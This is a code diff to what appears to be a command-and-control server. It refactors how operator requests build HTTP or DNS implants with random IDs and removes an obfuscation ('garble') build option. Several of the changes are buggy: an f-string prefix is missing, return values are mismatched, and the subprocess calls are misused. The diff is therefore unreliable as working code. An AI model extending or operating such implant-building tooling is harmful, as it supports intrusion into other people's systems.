@@ -104,6 +104,7 @@ def get_routes():
             for route in routes:
                 update_route_status(route, route_status, route_name)
 
+    print("Loading routes as follows:")
     print(route_status)
 
 
@@ -156,22 +157,21 @@ def build_implant(protocol):
     :return: bool depending on build success
     """
     logger.info("building implant")
+    rand_rng = secrets.SystemRandom()
+    imp_id = rand_rng.randrange(1000,9999)
     match protocol:
         case "http":
             try:
-                result = subprocess.run(
-                    ["make http"],
+                result = subprocess.check_output(
+                    f"make http RAND_NUM={imp_id}",
                     cwd='../Implant',
-                    check=True,
-                    capture_output=True,
-                    text=True
+                    stderr=subprocess.STDOUT
                 )
                 logger.info("success building implant for HTTP")
                 print(result)
-                return True
+                return True, f"Implant ID: {imp_id}"
             except subprocess.CalledProcessError as e:
                 logger.error(f"error building: {e}")
-                logger.error(f"stdout: {e.stdout}")
                 logger.error(f"stderr: {e.stderr}")
                 return False
             except Exception as e:
@@ -179,19 +179,16 @@ def build_implant(protocol):
                 return False
         case "dns":
             try:
-                result = subprocess.run(
-                    ["make dns"],
+                result = subprocess.Popen(
+                    "make dns RAND_NUM={imp_id}",
                     cwd='../Implant',
-                    check=True,
-                    capture_output=True,
-                    text=True
+                    stderr=subprocess.STDOUT
                 )
                 logger.info("success building implant for DNS")
                 print(result)
-                return True
+                return True, f"Implant ID: {imp_id}"
             except subprocess.CalledProcessError as e:
                 logger.error(f"error building: {e}")
-                logger.error(f"stdout: {e.stdout}")
                 logger.error(f"stderr: {e.stderr}")
                 return False
             except Exception as e:
@@ -430,25 +427,16 @@ def handle_client(client_socket, client_id):
 
             case "BLD":
                 logger.info("controller building new implant")
-                request_type, uname, token, garbler, *message = client_request.split(" ", 4)
+                request_type, uname, token, proto, *message = client_request.split(" ", 4)
                 logger.info(f"checking session token")
                 if token in operator_session_tokens:
-                    if garbler == "y":
-                        bld_status = garble_implant(message[0])
-                        if bld_status is True:
-                            client_socket.send("Garbling implant succeeded! :blue".encode())
-                        else:
-                            client_socket.send("Garbling implant failed... :red".encode())
-                    if garbler == "n":
-                        bld_status = build_implant(message[0])
-                        if bld_status is True:
-                            client_socket.send("Building implant succeeded! :blue".encode())
-                        else:
-                            client_socket.send("Building implant failed... :red".encode())
+                    bld_status, bld_msg = build_implant(proto)
+                    if bld_status is True:
+                        client_socket.send(f"Building implant succeeded! {bld_msg}".encode())
                     else:
-                        client_socket.send("Not able to build, see log... :yellow".encode())
-                        logger.error(f"unknown error occurred when trying to build {request_type} {uname} token"
-                                     f" {garbler} {message[0]}")
+                        client_socket.send("Building implant failed... :red".encode())
+                        logger.error(f"unknown error occurred when trying to build:\n"
+                        f"Command was {request_type} {uname} {proto}")
                 else:
                     client_socket.send(f"Bad token :red".encode())
                     logger.error("bad token")
